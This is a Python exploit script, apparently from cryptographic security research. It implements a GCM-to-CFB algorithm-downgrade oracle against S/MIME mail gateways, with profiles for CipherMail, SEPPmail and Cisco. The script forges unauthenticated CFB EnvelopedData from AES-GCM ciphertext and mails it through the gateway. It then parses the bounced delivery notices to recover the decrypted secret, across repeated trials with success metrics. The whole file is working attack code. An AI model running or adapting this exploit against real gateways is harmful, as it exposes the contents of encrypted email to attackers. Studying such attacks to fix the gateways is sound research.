#!/usr/bin/env -S authbind --deep uv run
# /// script
# dependencies = ["asn1crypto>=1.5.1", "aiosmtpd>=1.4"]
# ///
"""GCM->CFB algorithm-downgrade header-decryption oracle.

Encrypts a secret code with AES-256-GCM, then re-wraps the same ciphertext
as an (unauthenticated) AES-256-CFB EnvelopedData that splices a crafted
Content-Type header into the decrypted stream. The resulting malformed inner
message causes the gateway to bounce back a DSN carrying the decrypted
header/body, which is parsed here to recover the secret code and confirm the
downgrade succeeded.

Usage: ./header_decrypt_gcm_downgrade.py <profile>
  profile  ciphermail | seppmail | cisco
"""

import re
import sys
import time
from pathlib import Path

_ROOT = Path(__file__).resolve().parent
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))

import smime_harness_lib as H

MET = Path(".cache-metrics/header_decrypt_gcm_downgrade")

END_DELTA = H.xor(b'Content-Type: te', b'X: ooooooooooo\n\n')

def main() -> None:
    args = H.parse_args()

    guest_smtp, capture_host = H.PROFILES[args.profile]
    cert = H.cert_pem(args.profile)

    ok = 0
    trial_s = []
    sink = H.Sink(capture_host)
    t0 = time.perf_counter()
    for _ in range(args.trials):
        if _ % 20 == 0:
            print(f"Trial {_} of {args.trials} ({ok} ok)")
        trial_t0 = time.perf_counter()
        der = H.secret_code_gcm(cert)
        nonce, ct = H.gcm_nonce_ct(der)
        ct = H.blks(ct)
        nnonce = H.ctr(nonce, 1)
        stream = ct[0] + H.ctr(nonce, 7) + ct[6] + nnonce + H.xor(END_DELTA, ct[0])
        forged = H.pack_iv_ct(der, nnonce, stream, H.AES256_CFB)

        raw = H.bounce_capture(
            guest_smtp,
            sink,
            H.wrap_pkcs7(forged, "probe@external.test", {"Subject": "gcm header decrypt"}),
            b"gcm header decrypt"
        )
        try:
            hdr = H.dsn_rfc822_headers(raw)
        except Exception as e:
            print("==================== FAIL 3 ====================")
            print("dsn_rfc822_headers parse error (harness, not gateway):", type(e).__name__, e)
            print(raw)
            print("================================================")
            exit()
        if b'Content-Type: te' in hdr:
            res = hdr[hdr.index(b'Content-Type: te'):]
            assert 16 <= res.index(b"\n")<=79
            code_match = re.search(rb"Code: [0-9a-f]{10}", res[16:64])
            success = code_match is not None
            ok += 1 if success else 0
            if not success:
                low = 32+res[:48].count(b"\n")
                high = len(res)
                if b"X-SM-decrypted: " in res:
                    high = res.index(b"X-SM-decrypted: ")
                if b"X: ooooooooooo" in res:
                    high = min(high, res.index(b"X: ooooooooooo"))
                if len(res[low:high]) >= 16 + res[low:high].count(b"\n"):
                    print("==================== FAIL 1 ====================")
                    print(res[32:])
                    print(hdr)
                    print(raw)
                    print("================================================")
                    exit()
        else:
            print("==================== FAIL 2 ====================")
            print(hdr)
            print(raw)
            print("================================================")
            exit()
        elapsed_s = time.perf_counter() - trial_t0
        trial_s.append(elapsed_s)


    timing = H.attack_timing_metrics(time.perf_counter() - t0, trial_s, None)
    print(ok, "/", args.trials, H.metrics_json(MET, args.profile, ok=ok, n=args.trials, **timing))


if __name__ == "__main__":
    main()
